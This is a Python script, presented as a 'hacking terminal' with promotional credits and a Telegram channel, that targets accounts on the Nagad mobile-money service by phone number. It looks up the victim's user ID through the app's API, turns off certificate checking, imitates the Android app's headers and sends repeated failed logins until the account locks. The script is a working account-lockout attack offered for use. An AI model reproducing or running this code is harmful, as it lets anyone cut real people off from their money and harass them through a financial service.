import requests
import json
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
import urllib3

# Disable warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def hacking_animation():
    """Create a Hollywood-style hacking animation."""
    console.print(
        Panel.fit(
            "[bold green]WELCOME TO THE HACKING TERMINAL[/bold green]\n"
            "[bold red]Owner:[/bold red] Fahim Muntasir\n"
            "[bold blue]Developer:[/bold blue] @bytemasterrap\n"
            "[yellow]Channel:[/yellow] https://t.me/fahimciphers",
            title="[bold magenta]HACKING STARTED[/bold magenta]",
        )
    )
    time.sleep(2)

    console.print("[bold cyan]Establishing secure connection...[/bold cyan]")
    progress_bar("Establishing connection")
    console.print("[bold green]Connection established successfully![/bold green]\n")

def progress_bar(task):
    """Show a progress bar."""
    for _ in track(range(10), description=task, style="green"):
        time.sleep(0.3)

def perform_hack():
    """Main hacking function."""
    number = console.input("[bold red]Enter the target phone number: [/bold red]")
    if not number:
        console.print("[bold red]Error: Phone number is required![/bold red]", style="bold yellow")
        return

    pin = '6C237681E70921603A306BE9A1A5D9833FCE5C1E268F52B1650970EAAD0DCE21'
    mang = pin * 10

    api = f"https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn={number}"
    headers = {
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1164",
        "X-KM-DEVICE-FGP": "19DC58E052A91F5B2EB59399AABB2B898CA68CFE780878C0DB69EAAB0553C3C6",
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01",
    }

    try:
        response = requests.get(api, headers=headers, verify=False)
        if response.status_code != 200:
            console.print("[bold red]Error fetching user data![/bold red]", style="bold yellow")
            return

        user_data = response.json()
        if 'userId' not in user_data:
            console.print("[bold red]Error: userId not found![/bold red]", style="bold yellow")
            return

        userId = user_data['userId']
        console.print(f"[bold green]User ID retrieved: {userId}[/bold green]")

        # Simulate account blocking attempts
        block_api = 'https://app2.mynagad.com:20002/api/login'
        successful_requests = 0
        account_locked = False  # Track if account is locked
        for _ in range(6):
            payload = {
                'aspId': '100012345612345',
                'password': mang,
                'username': number,
            }
            login_headers = {
                'User-Agent': 'okhttp/3.14.9',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'X-KM-UserId': userId,
                'X-KM-User-AspId': '100012345612345',
                'X-KM-User-Agent': 'ANDROID/1164',
                'X-KM-Accept-language': 'bn',
                'X-KM-AppCode': '01',
                'Content-Type': 'application/json; charset=UTF-8',
            }

            response = requests.post(block_api, json=payload, headers=login_headers, verify=False)
            console.print(f"Attempt {_+1}: Status Code: {response.status_code}")
            console.print(f"Response: {response.text}")

            # Check if the account is locked
            if '"reason":"11_0036_137"' in response.text:
                account_locked = True
            elif response.status_code == 200:
                successful_requests += 1
            time.sleep(2)  # Delay between requests

        if account_locked:
            console.print(Panel.fit(
                f"[bold green]SUCCESS![/bold green]\n[cyan]Account for {number} is locked successfully![/cyan]",
                title="[bold red]MISSION ACCOMPLISHED[/bold red]",
            ))
        elif successful_requests > 0:
            console.print(Panel.fit(
                f"[bold green]SUCCESS![/bold green]\n[cyan]Total successful requests:[/cyan] {successful_requests}\n"
                f"[magenta]Message:[/magenta] Nagad account blocked successfully!",
                title="[bold red]MISSION ACCOMPLISHED[/bold red]",
            ))
        else:
            console.print(Panel.fit(
                "[bold red]FAILED![/bold red]\nCould not block the account in all attempts.",
                title="[bold yellow]OPERATION FAILED[/bold yellow]",
            ))

    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]", style="bold yellow")


# Run the hacking interface
hacking_animation()
perform_hack()
